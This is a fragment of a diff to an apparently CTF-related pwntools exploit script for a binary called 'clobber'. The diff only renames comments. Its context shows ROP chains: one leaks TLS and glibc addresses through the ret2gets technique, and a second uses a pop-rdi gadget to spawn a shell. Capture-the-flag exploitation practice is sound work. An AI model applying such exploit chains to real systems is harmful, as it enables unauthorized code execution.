@@ -12,7 +12,7 @@ p = gdb.debug('./clobber_patched', '''
 
 # p = remote('clobber.umbccd.net', 13373)
 
-# Stage 1: ROP to leak tls/glibc (ret2gets)
+# 1. ROP to leak tls/glibc (ret2gets)
 e = ELF('./clobber_patched')
 chain1 = [
     e.plt.gets,
@@ -34,7 +34,7 @@ log.info(f"tls base address: {hex(tls_base_addr)}")
 glibc_base_addr = tls_base_addr+0x28c0
 log.info(f"glibc base address: {hex(glibc_base_addr)}")
 
-# Stage 2: ROP to pop a shell
+# 2. ROP to pop a shell
 glibc_e = ELF('./libc.so.6')
 chain2 = [
     glibc_base_addr+next(glibc_e.search(asm('pop rdi; ret;'), executable=True)),
